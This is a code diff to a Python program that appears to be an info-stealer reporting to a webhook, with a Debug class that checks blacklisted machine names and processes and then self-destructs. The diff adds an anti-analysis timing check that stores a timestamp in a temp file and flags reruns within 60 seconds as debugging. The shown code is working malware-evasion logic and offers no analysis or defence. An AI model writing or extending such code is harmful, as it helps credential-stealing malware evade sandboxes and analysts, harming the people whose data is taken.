@@ -9,6 +9,7 @@ import sqlite3
 import subprocess
 import sys
 import threading
+import time
 import uuid
 from shutil import copy2
 from sys import argv
@@ -46,6 +47,7 @@ __CONFIG__ = {
 #global variables
 tempfolder = mkdtemp()
 localappdata = os.getenv("localappdata")
+temp = os.getenv("temp")
 
 
 def main(webhook: str):
@@ -904,6 +906,8 @@ class Debug:
             debugging = True
         if self.get_system():
             debugging = True
+        if self.check_time():
+            debugging = True
         return debugging
 
     def check_process(self) -> bool:
@@ -937,6 +941,24 @@ class Debug:
             return True
         if hostname in self.blackListedPCNames:
             return True
+
+    def check_time(self) -> bool:
+        current_time = time.time()
+        try:
+            with open(f"{temp}\\dd_setup.txt", "r") as f:
+                code = f.read()
+                if code != "":
+                    old_time = float(code)
+                    if current_time - old_time > 60:
+                        with open(f"{temp}\\dd_setup.txt", "w") as f:
+                            f.write(str(current_time))
+                        return False
+                    else:
+                        return True
+        except FileNotFoundError:
+            with open(f"{temp}\\dd_setup.txt", "w") as g:
+                g.write(str(current_time))
+            return False
 
     def self_destruct(self) -> None:
         exit()
